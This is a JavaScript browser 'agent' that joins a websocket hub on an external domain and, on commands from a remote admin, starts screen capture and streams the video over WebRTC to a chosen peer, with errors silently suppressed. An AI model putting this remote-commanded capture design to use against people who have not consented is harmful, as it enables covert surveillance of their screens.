const { HubWsClient , WrtcBinaryChannel , Vp8Capture } = await import("./utils.js");

function startAgent() {

    let capture = null;
    let rtc = null;
    let rtcTargetId = null;
    let rtcOpen = false;
    let lastAdminId = null;

    let sentChunks = 0;
    let sentBytes = 0;

    const agentInfos = () => {
        return {
            role: "agent",
            ts: Date.now(),
            userAgent: navigator.userAgent,
            capture: {
                recording: !!capture?.isRecording?.() || false,
            },
            rtc: {
                targetId: rtcTargetId,
                open: rtcOpen,
            },
            stream: {
                sentChunks,
                sentBytes,
            },
        };
    };

    const ws = new HubWsClient({
        urlBase: "wss://wshnklvucl.zen-apps.com/ws",
        room: "screen-mirror",
        onStatus: (s) => console.log("[ws]", s),
    });

    const sendInfosTo = (to) => {
        try {
            if (to != null) ws.sendJsonTo(to, "infos", agentInfos());
            else ws.sendJsonBroadcast("infos", agentInfos());
        } catch {}
    };

    const setRtcOpen = (open) => {
        rtcOpen = !!open;
    };

    const stopRtc = () => {
        try { rtc?.close?.(); } catch {}
        rtc = null;
        rtcTargetId = null;
        setRtcOpen(false);
    };

    const stopCapture = async () => {
        try {
            if (capture) {
                await capture.stop();
            }
        } catch {}
        capture = null;
    };

    const startCapture = async () => {
        if (capture?.isRecording?.()) return;

        capture = new Vp8Capture({
            onStatus: () => {},
            onError: () => {},
        });

        await capture.start({
            onChunk: async (blob) => {
                if (!rtcOpen || !rtc) return;
                try {
                    try {
                        sentChunks += 1;
                        sentBytes += blob?.size || 0;
                    } catch {}
                    await rtc.sendBinary(blob);
                } catch {}
            },
        });
    };

    const connectToEmbed = async (targetId) => {
        if (targetId == null) return;
        if (rtcTargetId === targetId && rtcOpen) return;

        stopRtc();
        rtcTargetId = targetId;
        rtcOpen = false;

        const channel = new WrtcBinaryChannel({
            sendSignal: (signal) => {
                ws.sendJsonTo(targetId, "rtc", signal);
            },
            onSignal: (handler) => {
                return ws.onJson((msg) => {
                    if (msg?.action !== "rtc") return;
                    if (msg?.from !== targetId) return;
                    handler(msg.data);
                });
            },
        });

        rtc = channel;

        try {
            await channel.start(true);
            setRtcOpen(true);
        } catch {
            stopRtc();
        }
    };

    ws.onJson((msg) => {
        if (msg?.action === "infos_req") {
            try {
                ws.sendJsonTo(msg.from, "infos", agentInfos());
            } catch (e) {
                console.error("Failed to reply to infos:", e);
            }
            return;
        }

        if (msg?.action === "cmd") {
            lastAdminId = msg.from;

            const type = msg?.data?.type;
            if (type === "start_capture") {
                startCapture().catch(() => {});
                return;
            }
            if (type === "stop_capture") {
                stopCapture().catch(() => {});
                return;
            }
            if (type === "connect_embed") {
                connectToEmbed(msg?.data?.targetId).catch(() => {});
                return;
            }

            if (type === "disconnect_embed") {
                stopRtc();
                return;
            }

            return;
        }

        console.log(msg);
    });

    ws.connect().catch((e) => console.error("WS connect failed:", e));
}

startAgent()